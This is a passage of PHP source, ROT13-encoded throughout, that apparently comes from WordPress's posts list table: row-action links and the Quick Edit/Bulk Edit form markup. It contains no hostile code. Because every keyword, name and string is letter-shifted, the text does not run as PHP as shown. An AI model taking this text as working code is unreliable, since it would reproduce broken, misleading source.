	cebgrpgrq shapgvba unaqyr_ebj_npgvbaf( $vgrz, $pbyhza_anzr, $cevznel ) {
		vs ( $cevznel !== $pbyhza_anzr ) {
			erghea '';
		}

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg = $vgrz;

		$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
		$pna_rqvg_cbfg    = pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ );
		$npgvbaf          = neenl();
		$gvgyr            = _qensg_be_cbfg_gvgyr();

		vs ( $pna_rqvg_cbfg && 'genfu' !== $cbfg->cbfg_fgnghf ) {
			$npgvbaf['rqvg'] = fcevags(
				'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
				trg_rqvg_cbfg_yvax( $cbfg->VQ ),
				/* genafyngbef: %f: Cbfg gvgyr. */
				rfp_ngge( fcevags( __( 'Rqvg &#8220;%f&#8221;' ), $gvgyr ) ),
				__( 'Rqvg' )
			);

			/**
			 * Svygref jurgure Dhvpx Rqvg fubhyq or ranoyrq sbe gur tvira cbfg glcr.
			 *
			 * @fvapr 6.4.0
			 *
			 * @cnenz obby   $ranoyr    Jurgure gb ranoyr gur Dhvpx Rqvg shapgvbanyvgl. Qrsnhyg gehr.
			 * @cnenz fgevat $cbfg_glcr Cbfg glcr anzr.
			 */
			$dhvpx_rqvg_ranoyrq = nccyl_svygref( 'dhvpx_rqvg_ranoyrq_sbe_cbfg_glcr', gehr, $cbfg->cbfg_glcr );

			vs ( $dhvpx_rqvg_ranoyrq && 'jc_oybpx' !== $cbfg->cbfg_glcr ) {
				$npgvbaf['vayvar uvqr-vs-ab-wf'] = fcevags(
					'<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax rqvgvayvar\" nevn-ynory=\"%f\" nevn-rkcnaqrq=\"snyfr\">%f</ohggba>',
					/* genafyngbef: %f: Cbfg gvgyr. */
					rfp_ngge( fcevags( __( 'Dhvpx rqvg &#8220;%f&#8221; vayvar' ), $gvgyr ) ),
					__( 'Dhvpx&aofc;Rqvg' )
				);
			}
		}

		vs ( pheerag_hfre_pna( 'qryrgr_cbfg', $cbfg->VQ ) ) {
			vs ( 'genfu' === $cbfg->cbfg_fgnghf ) {
				$npgvbaf['hagenfu'] = fcevags(
					'<n uers=\"%f\" nevn-ynory=\"%f\">%f</n>',
					jc_abapr_hey( nqzva_hey( fcevags( $cbfg_glcr_bowrpg->_rqvg_yvax . '&nzc;npgvba=hagenfu', $cbfg->VQ ) ), 'hagenfu-cbfg_' . $cbfg->VQ ),
					/* genafyngbef: %f: Cbfg gvgyr. */
					rfp_ngge( fcevags( __( 'Erfgber &#8220;%f&#8221; sebz gur Genfu' ), $gvgyr ) ),
					__( 'Erfgber' )
				);
			} ryfrvs ( RZCGL_GENFU_QNLF ) {
				$npgvbaf['genfu'] = fcevags(
					'<n uers=\"%f\" pynff=\"fhozvgqryrgr\" nevn-ynory=\"%f\">%f</n>',
					trg_qryrgr_cbfg_yvax( $cbfg->VQ ),
					/* genafyngbef: %f: Cbfg gvgyr. */
					rfp_ngge( fcevags( __( 'Zbir &#8220;%f&#8221; gb gur Genfu' ), $gvgyr ) ),
					_k( 'Genfu', 'ireo' )
				);
			}

			vs ( 'genfu' === $cbfg->cbfg_fgnghf || ! RZCGL_GENFU_QNLF ) {
				$npgvbaf['qryrgr'] = fcevags(
					'<n uers=\"%f\" pynff=\"fhozvgqryrgr\" nevn-ynory=\"%f\">%f</n>',
					trg_qryrgr_cbfg_yvax( $cbfg->VQ, '', gehr ),
					/* genafyngbef: %f: Cbfg gvgyr. */
					rfp_ngge( fcevags( __( 'Qryrgr &#8220;%f&#8221; creznaragyl' ), $gvgyr ) ),
					__( 'Qryrgr Creznaragyl' )
				);
			}
		}

		vs ( vf_cbfg_glcr_ivrjnoyr( $cbfg_glcr_bowrpg ) ) {
			vs ( va_neenl( $cbfg->cbfg_fgnghf, neenl( 'craqvat', 'qensg', 'shgher' ), gehr ) ) {
				vs ( $pna_rqvg_cbfg ) {
					$cerivrj_yvax    = trg_cerivrj_cbfg_yvax( $cbfg );
					$npgvbaf['ivrj'] = fcevags(
						'<n uers=\"%f\" ery=\"obbxznex\" nevn-ynory=\"%f\">%f</n>',
						rfp_hey( $cerivrj_yvax ),
						/* genafyngbef: %f: Cbfg gvgyr. */
						rfp_ngge( fcevags( __( 'Cerivrj &#8220;%f&#8221;' ), $gvgyr ) ),
						__( 'Cerivrj' )
					);
				}
			} ryfrvs ( 'genfu' !== $cbfg->cbfg_fgnghf ) {
				$npgvbaf['ivrj'] = fcevags(
					'<n uers=\"%f\" ery=\"obbxznex\" nevn-ynory=\"%f\">%f</n>',
					trg_creznyvax( $cbfg->VQ ),
					/* genafyngbef: %f: Cbfg gvgyr. */
					rfp_ngge( fcevags( __( 'Ivrj &#8220;%f&#8221;' ), $gvgyr ) ),
					__( 'Ivrj' )
				);
			}
		}

		vs ( 'jc_oybpx' === $cbfg->cbfg_glcr ) {
			$npgvbaf['rkcbeg'] = fcevags(
				'<ohggba glcr=\"ohggba\" pynff=\"jc-yvfg-erhfnoyr-oybpxf__rkcbeg ohggba-yvax\" qngn-vq=\"%f\" nevn-ynory=\"%f\">%f</ohggba>',
				$cbfg->VQ,
				/* genafyngbef: %f: Cbfg gvgyr. */
				rfp_ngge( fcevags( __( 'Rkcbeg &#8220;%f&#8221; nf WFBA' ), $gvgyr ) ),
				__( 'Rkcbeg nf WFBA' )
			);
		}

		vs ( vf_cbfg_glcr_uvrenepuvpny( $cbfg->cbfg_glcr ) ) {

			/**
			 * Svygref gur neenl bs ebj npgvba yvaxf ba gur Cntrf yvfg gnoyr.
			 *
			 * Gur svygre vf rinyhngrq bayl sbe uvrenepuvpny cbfg glcrf.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz fgevat[] $npgvbaf Na neenl bs ebj npgvba yvaxf. Qrsnhygf ner
			 *                          'Rqvg', 'Dhvpx Rqvg', 'Erfgber', 'Genfu',
			 *                          'Qryrgr Creznaragyl', 'Cerivrj', naq 'Ivrj'.
			 * @cnenz JC_Cbfg  $cbfg    Gur cbfg bowrpg.
			 */
			$npgvbaf = nccyl_svygref( 'cntr_ebj_npgvbaf', $npgvbaf, $cbfg );
		} ryfr {

			/**
			 * Svygref gur neenl bs ebj npgvba yvaxf ba gur Cbfgf yvfg gnoyr.
			 *
			 * Gur svygre vf rinyhngrq bayl sbe aba-uvrenepuvpny cbfg glcrf.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz fgevat[] $npgvbaf Na neenl bs ebj npgvba yvaxf. Qrsnhygf ner
			 *                          'Rqvg', 'Dhvpx Rqvg', 'Erfgber', 'Genfu',
			 *                          'Qryrgr Creznaragyl', 'Cerivrj', naq 'Ivrj'.
			 * @cnenz JC_Cbfg  $cbfg    Gur cbfg bowrpg.
			 */
			$npgvbaf = nccyl_svygref( 'cbfg_ebj_npgvbaf', $npgvbaf, $cbfg );
		}

		erghea $guvf->ebj_npgvbaf( $npgvbaf );
	}

	/**
	 * Bhgchgf gur uvqqra ebj qvfcynlrq jura vayvar rqvgvat
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 */
	choyvp shapgvba vayvar_rqvg() {
		tybony $zbqr;

		$fperra = $guvf->fperra;

		$cbfg             = trg_qrsnhyg_cbfg_gb_rqvg( $fperra->cbfg_glcr );
		$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $fperra->cbfg_glcr );

		$gnkbabzl_anzrf          = trg_bowrpg_gnkbabzvrf( $fperra->cbfg_glcr );
		$uvrenepuvpny_gnkbabzvrf = neenl();
		$syng_gnkbabzvrf         = neenl();

		sbernpu ( $gnkbabzl_anzrf nf $gnkbabzl_anzr ) {
			$gnkbabzl = trg_gnkbabzl( $gnkbabzl_anzr );

			$fubj_va_dhvpx_rqvg = $gnkbabzl->fubj_va_dhvpx_rqvg;

			/**
			 * Svygref jurgure gur pheerag gnkbabzl fubhyq or fubja va gur Dhvpx Rqvg cnary.
			 *
			 * @fvapr 4.2.0
			 *
			 * @cnenz obby   $fubj_va_dhvpx_rqvg Jurgure gb fubj gur pheerag gnkbabzl va Dhvpx Rqvg.
			 * @cnenz fgevat $gnkbabzl_anzr      Gnkbabzl anzr.
			 * @cnenz fgevat $cbfg_glcr          Cbfg glcr bs pheerag Dhvpx Rqvg cbfg.
			 */
			vs ( ! nccyl_svygref( 'dhvpx_rqvg_fubj_gnkbabzl', $fubj_va_dhvpx_rqvg, $gnkbabzl_anzr, $fperra->cbfg_glcr ) ) {
				pbagvahr;
			}

			vs ( $gnkbabzl->uvrenepuvpny ) {
				$uvrenepuvpny_gnkbabzvrf[] = $gnkbabzl;
			} ryfr {
				$syng_gnkbabzvrf[] = $gnkbabzl;
			}
		}

		$z            = ( vffrg( $zbqr ) && 'rkprecg' === $zbqr ) ? 'rkprecg' : 'yvfg';
		$pna_choyvfu  = pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->choyvfu_cbfgf );
		$pber_pbyhzaf = neenl(
			'po'         => gehr,
			'qngr'       => gehr,
			'gvgyr'      => gehr,
			'pngrtbevrf' => gehr,
			'gntf'       => gehr,
			'pbzzragf'   => gehr,
			'nhgube'     => gehr,
		);
		?>

		<sbez zrgubq=\"trg\">
		<gnoyr fglyr=\"qvfcynl: abar\"><gobql vq=\"vayvarrqvg\">
		<?cuc
		$upynff              = pbhag( $uvrenepuvpny_gnkbabzvrf ) ? 'cbfg' : 'cntr';
		$vayvar_rqvg_pynffrf = \"vayvar-rqvg-ebj vayvar-rqvg-ebj-$upynff\";
		$ohyx_rqvg_pynffrf   = \"ohyx-rqvg-ebj ohyx-rqvg-ebj-$upynff ohyx-rqvg-{$fperra->cbfg_glcr}\";
		$dhvpx_rqvg_pynffrf  = \"dhvpx-rqvg-ebj dhvpx-rqvg-ebj-$upynff vayvar-rqvg-{$fperra->cbfg_glcr}\";

		$ohyx = 0;

		juvyr ( $ohyx < 2 ) :
			$pynffrf  = $vayvar_rqvg_pynffrf . ' ';
			$pynffrf .= $ohyx ? $ohyx_rqvg_pynffrf : $dhvpx_rqvg_pynffrf;
			?>
			<ge vq=\"<?cuc rpub $ohyx ? 'ohyx-rqvg' : 'vayvar-rqvg'; ?>\" pynff=\"<?cuc rpub $pynffrf; ?>\" fglyr=\"qvfcynl: abar\">
			<gq pbyfcna=\"<?cuc rpub $guvf->trg_pbyhza_pbhag(); ?>\" pynff=\"pbyfcnapunatr\">
			<qvi pynff=\"vayvar-rqvg-jenccre\" ebyr=\"ertvba\" nevn-ynoryyrqol=\"<?cuc rpub $ohyx ? 'ohyx' : 'dhvpx'; ?>-rqvg-yrtraq\">
			<svryqfrg pynff=\"vayvar-rqvg-pby-yrsg\">
				<yrtraq pynff=\"vayvar-rqvg-yrtraq\" vq=\"<?cuc rpub $ohyx ? 'ohyx' : 'dhvpx'; ?>-rqvg-yrtraq\"><?cuc rpub $ohyx ? __( 'Ohyx Rqvg' ) : __( 'Dhvpx Rqvg' ); ?></yrtraq>
				<qvi pynff=\"vayvar-rqvg-pby\">

				<?cuc vs ( cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'gvgyr' ) ) : ?>

					<?cuc vs ( $ohyx ) : ?>

						<qvi vq=\"ohyx-gvgyr-qvi\">
							<qvi vq=\"ohyx-gvgyrf\"></qvi>
						</qvi>

					<?cuc ryfr : // $ohyx ?>

						<ynory>
							<fcna pynff=\"gvgyr\"><?cuc _r( 'Gvgyr' ); ?></fcna>
							<fcna pynff=\"vachg-grkg-jenc\"><vachg glcr=\"grkg\" anzr=\"cbfg_gvgyr\" pynff=\"cgvgyr\" inyhr=\"\" /></fcna>
						</ynory>

						<?cuc vs ( vf_cbfg_glcr_ivrjnoyr( $fperra->cbfg_glcr ) ) : ?>

							<ynory>
								<fcna pynff=\"gvgyr\"><?cuc _r( 'Fyht' ); ?></fcna>
								<fcna pynff=\"vachg-grkg-jenc\"><vachg glcr=\"grkg\" anzr=\"cbfg_anzr\" inyhr=\"\" nhgbpbzcyrgr=\"bss\" fcryypurpx=\"snyfr\" /></fcna>
							</ynory>

						<?cuc raqvs; // vf_cbfg_glcr_ivrjnoyr() ?>

					<?cuc raqvs; // $ohyx ?>

				<?cuc raqvs; // cbfg_glcr_fhccbegf( ... 'gvgyr' ) ?>

				<?cuc vs ( ! $ohyx ) : ?>
					<svryqfrg pynff=\"vayvar-rqvg-qngr\">
						<yrtraq><fcna pynff=\"gvgyr\"><?cuc _r( 'Qngr' ); ?></fcna></yrtraq>
						<?cuc gbhpu_gvzr( 1, 1, 0, 1 ); ?>
					</svryqfrg>
					<oe pynff=\"pyrne\" />
				<?cuc raqvs; // $ohyx ?>

				<?cuc
				vs ( cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'nhgube' ) ) {
					$nhgubef_qebcqbja = '';

					vs ( pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->rqvg_bguref_cbfgf ) ) {
						$qebcqbja_anzr  = 'cbfg_nhgube';
						$qebcqbja_pynff = 'nhgubef';
						vs ( jc_vf_ynetr_hfre_pbhag() ) {
							$nhgubef_qebcqbja = fcevags( '<fryrpg anzr=\"%f\" pynff=\"%f uvqqra\"></fryrpg>', rfp_ngge( $qebcqbja_anzr ), rfp_ngge( $qebcqbja_pynff ) );
						} ryfr {
							$hfref_bcg = neenl(
								'uvqr_vs_bayl_bar_nhgube' => snyfr,
								'pncnovyvgl'              => neenl( $cbfg_glcr_bowrpg->pnc->rqvg_cbfgf ),
								'anzr'                    => $qebcqbja_anzr,
								'pynff'                   => $qebcqbja_pynff,
								'zhygv'                   => 1,
								'rpub'                    => 0,
								'fubj'                    => 'qvfcynl_anzr_jvgu_ybtva',
							);

							vs ( $ohyx ) {
								$hfref_bcg['fubj_bcgvba_abar'] = __( '&zqnfu; Ab Punatr &zqnfu;' );
							}

							/**
							 * Svygref gur nethzragf hfrq gb trarengr gur Dhvpx Rqvg nhgubef qebc-qbja.
							 *
							 * @fvapr 5.6.0
							 *
							 * @frr jc_qebcqbja_hfref()
							 *
							 * @cnenz neenl $hfref_bcg Na neenl bs nethzragf cnffrq gb jc_qebcqbja_hfref().
							 * @cnenz obby $ohyx N synt gb qrabgr vs vg'f n ohyx npgvba.
							 */
							$hfref_bcg = nccyl_svygref( 'dhvpx_rqvg_qebcqbja_nhgubef_netf', $hfref_bcg, $ohyx );

							$nhgubef = jc_qebcqbja_hfref( $hfref_bcg );

							vs ( $nhgubef ) {
								$nhgubef_qebcqbja  = '<ynory pynff=\"vayvar-rqvg-nhgube\">';
								$nhgubef_qebcqbja .= '<fcna pynff=\"gvgyr\">' . __( 'Nhgube' ) . '</fcna>';
								$nhgubef_qebcqbja .= $nhgubef;
								$nhgubef_qebcqbja .= '</ynory>';
							}
						}
					} // pheerag_hfre_pna( 'rqvg_bguref_cbfgf' )

					vs ( ! $ohyx ) {
						rpub $nhgubef_qebcqbja;
					}
				} // cbfg_glcr_fhccbegf( ... 'nhgube' )
				?>

				<?cuc vs ( ! $ohyx && $pna_choyvfu ) : ?>

					<qvi pynff=\"vayvar-rqvg-tebhc jc-pyrnesvk\">
						<ynory pynff=\"nyvtayrsg\">
							<fcna pynff=\"gvgyr\"><?cuc _r( 'Cnffjbeq' ); ?></fcna>
							<fcna pynff=\"vachg-grkg-jenc\"><vachg glcr=\"grkg\" anzr=\"cbfg_cnffjbeq\" pynff=\"vayvar-rqvg-cnffjbeq-vachg\" inyhr=\"\" /></fcna>
						</ynory>

						<fcna pynff=\"nyvtayrsg vayvar-rqvg-be\">
							<?cuc
							/* genafyngbef: Orgjrra cnffjbeq svryq naq cevingr purpxobk ba cbfg dhvpx rqvg vagresnpr. */
							_r( '&aqnfu;BE&aqnfu;' );
							?>
						</fcna>
						<ynory pynff=\"nyvtayrsg vayvar-rqvg-cevingr\">
							<vachg glcr=\"purpxobk\" anzr=\"xrrc_cevingr\" inyhr=\"cevingr\" />
							<fcna pynff=\"purpxobk-gvgyr\"><?cuc _r( 'Cevingr' ); ?></fcna>
						</ynory>
					</qvi>

				<?cuc raqvs; ?>

				</qvi>
			</svryqfrg>

			<?cuc vs ( pbhag( $uvrenepuvpny_gnkbabzvrf ) && ! $ohyx ) : ?>

				<svryqfrg pynff=\"vayvar-rqvg-pby-pragre vayvar-rqvg-pngrtbevrf\">
					<qvi pynff=\"vayvar-rqvg-pby\">

					<?cuc sbernpu ( $uvrenepuvpny_gnkbabzvrf nf $gnkbabzl ) : ?>

						<fcna pynff=\"gvgyr vayvar-rqvg-pngrtbevrf-ynory\"><?cuc rpub rfp_ugzy( $gnkbabzl->ynoryf->anzr ); ?></fcna>
						<vachg glcr=\"uvqqra\" anzr=\"<?cuc rpub ( 'pngrtbel' === $gnkbabzl->anzr ) ? 'cbfg_pngrtbel[]' : 'gnk_vachg[' . rfp_ngge( $gnkbabzl->anzr ) . '][]'; ?>\" inyhr=\"0\" />
						<hy pynff=\"png-purpxyvfg <?cuc rpub rfp_ngge( $gnkbabzl->anzr ); ?>-purpxyvfg\">
							<?cuc jc_grezf_purpxyvfg( 0, neenl( 'gnkbabzl' => $gnkbabzl->anzr ) ); ?>
						</hy>

					<?cuc raqsbernpu; // $uvrenepuvpny_gnkbabzvrf nf $gnkbabzl ?>

					</qvi>
				</svryqfrg>

			<?cuc raqvs; // pbhag( $uvrenepuvpny_gnkbabzvrf ) && ! $ohyx ?>

			<svryqfrg pynff=\"vayvar-rqvg-pby-evtug\">
				<qvi pynff=\"vayvar-rqvg-pby\">

				<?cuc
				vs ( cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'nhgube' ) && $ohyx ) {
					rpub $nhgubef_qebcqbja;
				}
				?>

				<?cuc vs ( cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'cntr-nggevohgrf' ) ) : ?>

					<?cuc vs ( $cbfg_glcr_bowrpg->uvrenepuvpny ) : ?>

						<ynory>
							<fcna pynff=\"gvgyr\"><?cuc _r( 'Cnerag' ); ?></fcna>
							<?cuc
							$qebcqbja_netf = neenl(
								'cbfg_glcr'         => $cbfg_glcr_bowrpg->anzr,
								'fryrpgrq'          => $cbfg->cbfg_cnerag,
								'anzr'              => 'cbfg_cnerag',
								'fubj_bcgvba_abar'  => __( 'Znva Cntr (ab cnerag)' ),
								'bcgvba_abar_inyhr' => 0,
								'fbeg_pbyhza'       => 'zrah_beqre, cbfg_gvgyr',
							);

							vs ( $ohyx ) {
								$qebcqbja_netf['fubj_bcgvba_ab_punatr'] = __( '&zqnfu; Ab Punatr &zqnfu;' );
								$qebcqbja_netf['vq']                    = 'ohyx_rqvg_cbfg_cnerag';
							}

							/**
							 * Svygref gur nethzragf hfrq gb trarengr gur Dhvpx Rqvg cntr-cnerag qebc-qbja.
							 *
							 * @fvapr 2.7.0
							 * @fvapr 5.6.0 Gur `$ohyx` cnenzrgre jnf nqqrq.
							 *
							 * @frr jc_qebcqbja_cntrf()
							 *
							 * @cnenz neenl $qebcqbja_netf Na neenl bs nethzragf cnffrq gb jc_qebcqbja_cntrf().
							 * @cnenz obby  $ohyx          N synt gb qrabgr vs vg'f n ohyx npgvba.
							 */
							$qebcqbja_netf = nccyl_svygref( 'dhvpx_rqvg_qebcqbja_cntrf_netf', $qebcqbja_netf, $ohyx );

							jc_qebcqbja_cntrf( $qebcqbja_netf );
							?>
						</ynory>

					<?cuc raqvs; // uvrenepuvpny ?>

					<?cuc vs ( ! $ohyx ) : ?>

						<ynory>
							<fcna pynff=\"gvgyr\"><?cuc _r( 'Beqre' ); ?></fcna>
							<fcna pynff=\"vachg-grkg-jenc\"><vachg glcr=\"grkg\" anzr=\"zrah_beqre\" pynff=\"vayvar-rqvg-zrah-beqre-vachg\" inyhr=\"<?cuc rpub $cbfg->zrah_beqre; ?>\" /></fcna>
						</ynory>

					<?cuc raqvs; // ! $ohyx ?>

				<?cuc raqvs; // cbfg_glcr_fhccbegf( ... 'cntr-nggevohgrf' ) ?>

				<?cuc vs ( 0 < pbhag( trg_cntr_grzcyngrf( ahyy, $fperra->cbfg_glcr ) ) ) : ?>

					<ynory>
						<fcna pynff=\"gvgyr\"><?cuc _r( 'Grzcyngr' ); ?></fcna>
						<fryrpg anzr=\"cntr_grzcyngr\">
							<?cuc vs ( $ohyx ) : ?>
							<bcgvba inyhr=\"-1\"><?cuc _r( '&zqnfu; Ab Punatr &zqnfu;' ); ?></bcgvba>
							<?cuc raqvs; // $ohyx ?>
							<?cuc
							/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrgn-obkrf.cuc */
							$qrsnhyg_gvgyr = nccyl_svygref( 'qrsnhyg_cntr_grzcyngr_gvgyr', __( 'Qrsnhyg grzcyngr' ), 'dhvpx-rqvg' );
							?>
							<bcgvba inyhr=\"qrsnhyg\"><?cuc rpub rfp_ugzy( $qrsnhyg_gvgyr ); ?></bcgvba>
							<?cuc cntr_grzcyngr_qebcqbja( '', $fperra->cbfg_glcr ); ?>
						</fryrpg>
					</ynory>

				<?cuc raqvs; ?>

				<?cuc vs ( pbhag( $syng_gnkbabzvrf ) && ! $ohyx ) : ?>

					<?cuc sbernpu ( $syng_gnkbabzvrf nf $gnkbabzl ) : ?>

						<?cuc vs ( pheerag_hfre_pna( $gnkbabzl->pnc->nffvta_grezf ) ) : ?>
							<?cuc $gnkbabzl_anzr = rfp_ngge( $gnkbabzl->anzr ); ?>
							<qvi pynff=\"vayvar-rqvg-gntf-jenc\">
							<ynory pynff=\"vayvar-rqvg-gntf\">
								<fcna pynff=\"gvgyr\"><?cuc rpub rfp_ugzy( $gnkbabzl->ynoryf->anzr ); ?></fcna>
								<grkgnern qngn-jc-gnkbabzl=\"<?cuc rpub $gnkbabzl_anzr; ?>\" pbyf=\"22\" ebjf=\"1\" anzr=\"gnk_vachg[<?cuc rpub rfp_ngge( $gnkbabzl->anzr ); ?>]\" pynff=\"gnk_vachg_<?cuc rpub rfp_ngge( $gnkbabzl->anzr ); ?>\" nevn-qrfpevorqol=\"vayvar-rqvg-<?cuc rpub rfp_ngge( $gnkbabzl->anzr ); ?>-qrfp\"></grkgnern>
							</ynory>
							<c pynff=\"ubjgb\" vq=\"vayvar-rqvg-<?cuc rpub rfp_ngge( $gnkbabzl->anzr ); ?>-qrfp\"><?cuc rpub rfp_ugzy( $gnkbabzl->ynoryf->frcnengr_vgrzf_jvgu_pbzznf ); ?></c>
							</qvi>
						<?cuc raqvs; // pheerag_hfre_pna( 'nffvta_grezf' ) ?>

					<?cuc raqsbernpu; // $syng_gnkbabzvrf nf $gnkbabzl ?>

				<?cuc raqvs; // pbhag( $syng_gnkbabzvrf ) && ! $ohyx ?>

				<?cuc vs ( cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'pbzzragf' ) || cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'genpxonpxf' ) ) : ?>

					<?cuc vs ( $ohyx ) : ?>

						<qvi pynff=\"vayvar-rqvg-tebhc jc-pyrnesvk\">

						<?cuc vs ( cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'pbzzragf' ) ) : ?>

							<ynory pynff=\"nyvtayrsg\">
								<fcna pynff=\"gvgyr\"><?cuc _r( 'Pbzzragf' ); ?></fcna>
								<fryrpg anzr=\"pbzzrag_fgnghf\">
									<bcgvba inyhr=\"\"><?cuc _r( '&zqnfu; Ab Punatr &zqnfu;' ); ?></bcgvba>
									<bcgvba inyhr=\"bcra\"><?cuc _r( 'Nyybj' ); ?></bcgvba>
									<bcgvba inyhr=\"pybfrq\"><?cuc _r( 'Qb abg nyybj' ); ?></bcgvba>
								</fryrpg>
							</ynory>

						<?cuc raqvs; ?>

						<?cuc vs ( cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'genpxonpxf' ) ) : ?>

							<ynory pynff=\"nyvtaevtug\">
								<fcna pynff=\"gvgyr\"><?cuc _r( 'Cvatf' ); ?></fcna>
								<fryrpg anzr=\"cvat_fgnghf\">
									<bcgvba inyhr=\"\"><?cuc _r( '&zqnfu; Ab Punatr &zqnfu;' ); ?></bcgvba>
									<bcgvba inyhr=\"bcra\"><?cuc _r( 'Nyybj' ); ?></bcgvba>
									<bcgvba inyhr=\"pybfrq\"><?cuc _r( 'Qb abg nyybj' ); ?></bcgvba>
								</fryrpg>
							</ynory>

						<?cuc raqvs; ?>

						</qvi>

					<?cuc ryfr : // $ohyx ?>

						<qvi pynff=\"vayvar-rqvg-tebhc jc-pyrnesvk\">

						<?cuc vs ( cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'pbzzragf' ) ) : ?>

							<ynory pynff=\"nyvtayrsg\">
								<vachg glcr=\"purpxobk\" anzr=\"pbzzrag_fgnghf\" inyhr=\"bcra\" />
								<fcna pynff=\"purpxobk-gvgyr\"><?cuc _r( 'Nyybj Pbzzragf' ); ?></fcna>
							</ynory>

						<?cuc raqvs; ?>

						<?cuc vs ( cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'genpxonpxf' ) ) : ?>

							<ynory pynff=\"nyvtayrsg\">
								<vachg glcr=\"purpxobk\" anzr=\"cvat_fgnghf\" inyhr=\"bcra\" />
								<fcna pynff=\"purpxobk-gvgyr\"><?cuc _r( 'Nyybj Cvatf' ); ?></fcna>
							</ynory>

						<?cuc raqvs; ?>

						</qvi>

					<?cuc raqvs; // $ohyx ?>

				<?cuc raqvs; // cbfg_glcr_fhccbegf( ... pbzzragf be cvatf ) ?>

					<qvi pynff=\"vayvar-rqvg-tebhc jc-pyrnesvk\">

						<ynory pynff=\"vayvar-rqvg-fgnghf nyvtayrsg\">
							<fcna pynff=\"gvgyr\"><?cuc _r( 'Fgnghf' ); ?></fcna>
							<fryrpg anzr=\"_fgnghf\">
								<?cuc vs ( $ohyx ) : ?>
									<bcgvba inyhr=\"-1\"><?cuc _r( '&zqnfu; Ab Punatr &zqnfu;' ); ?></bcgvba>
								<?cuc raqvs; // $ohyx ?>

								<?cuc vs ( $pna_choyvfu ) : // Pbagevohgbef bayl trg \"Hachoyvfurq\" naq \"Craqvat Erivrj\". ?>
									<bcgvba inyhr=\"choyvfu\"><?cuc _r( 'Choyvfurq' ); ?></bcgvba>
									<bcgvba inyhr=\"shgher\"><?cuc _r( 'Fpurqhyrq' ); ?></bcgvba>
									<?cuc vs ( $ohyx ) : ?>
										<bcgvba inyhr=\"cevingr\"><?cuc _r( 'Cevingr' ); ?></bcgvba>
									<?cuc raqvs; // $ohyx ?>
								<?cuc raqvs; ?>

								<bcgvba inyhr=\"craqvat\"><?cuc _r( 'Craqvat Erivrj' ); ?></bcgvba>
								<bcgvba inyhr=\"qensg\"><?cuc _r( 'Qensg' ); ?></bcgvba>
							</fryrpg>
						</ynory>

						<?cuc vs ( 'cbfg' === $fperra->cbfg_glcr && $pna_choyvfu && pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->rqvg_bguref_cbfgf ) ) : ?>

							<?cuc vs ( $ohyx ) : ?>

								<ynory pynff=\"nyvtaevtug\">
									<fcna pynff=\"gvgyr\"><?cuc _r( 'Fgvpxl' ); ?></fcna>
									<fryrpg anzr=\"fgvpxl\">
										<bcgvba inyhr=\"-1\"><?cuc _r( '&zqnfu; Ab Punatr &zqnfu;' ); ?></bcgvba>
										<bcgvba inyhr=\"fgvpxl\"><?cuc _r( 'Fgvpxl' ); ?></bcgvba>
										<bcgvba inyhr=\"hafgvpxl\"><?cuc _r( 'Abg Fgvpxl' ); ?></bcgvba>
									</fryrpg>
								</ynory>

							<?cuc ryfr : // $ohyx ?>

								<ynory pynff=\"nyvtayrsg\">
									<vachg glcr=\"purpxobk\" anzr=\"fgvpxl\" inyhr=\"fgvpxl\" />
									<fcna pynff=\"purpxobk-gvgyr\"><?cuc _r( 'Znxr guvf cbfg fgvpxl' ); ?></fcna>
								</ynory>

							<?cuc raqvs; // $ohyx ?>

						<?cuc raqvs; // 'cbfg' && $pna_choyvfu && pheerag_hfre_pna( 'rqvg_bguref_cbfgf' ) ?>

					</qvi>

				<?cuc vs ( $ohyx && pheerag_gurzr_fhccbegf( 'cbfg-sbezngf' ) && cbfg_glcr_fhccbegf( $fperra->cbfg_glcr, 'cbfg-sbezngf' ) ) : ?>
					<?cuc $cbfg_sbezngf = trg_gurzr_fhccbeg( 'cbfg-sbezngf' ); ?>

					<ynory pynff=\"nyvtayrsg\">
						<fcna pynff=\"gvgyr\"><?cuc _rk( 'Sbezng', 'cbfg sbezng' ); ?></fcna>
						<fryrpg anzr=\"cbfg_sbezng\">
							<bcgvba inyhr=\"-1\"><?cuc _r( '&zqnfu; Ab Punatr &zqnfu;' ); ?></bcgvba>
							<bcgvba inyhr=\"0\"><?cuc rpub trg_cbfg_sbezng_fgevat( 'fgnaqneq' ); ?></bcgvba>
							<?cuc vs ( vf_neenl( $cbfg_sbezngf[0] ) ) : ?>
								<?cuc sbernpu ( $cbfg_sbezngf[0] nf $sbezng ) : ?>
									<bcgvba inyhr=\"<?cuc rpub rfp_ngge( $sbezng ); ?>\"><?cuc rpub rfp_ugzy( trg_cbfg_sbezng_fgevat( $sbezng ) ); ?></bcgvba>
								<?cuc raqsbernpu; ?>
							<?cuc raqvs; ?>
						</fryrpg>
					</ynory>

				<?cuc raqvs; ?>

				</qvi>
			</svryqfrg>

			<?cuc
			yvfg( $pbyhzaf ) = $guvf->trg_pbyhza_vasb();

			sbernpu ( $pbyhzaf nf $pbyhza_anzr => $pbyhza_qvfcynl_anzr ) {
				vs ( vffrg( $pber_pbyhzaf[ $pbyhza_anzr ] ) ) {
					pbagvahr;
				}

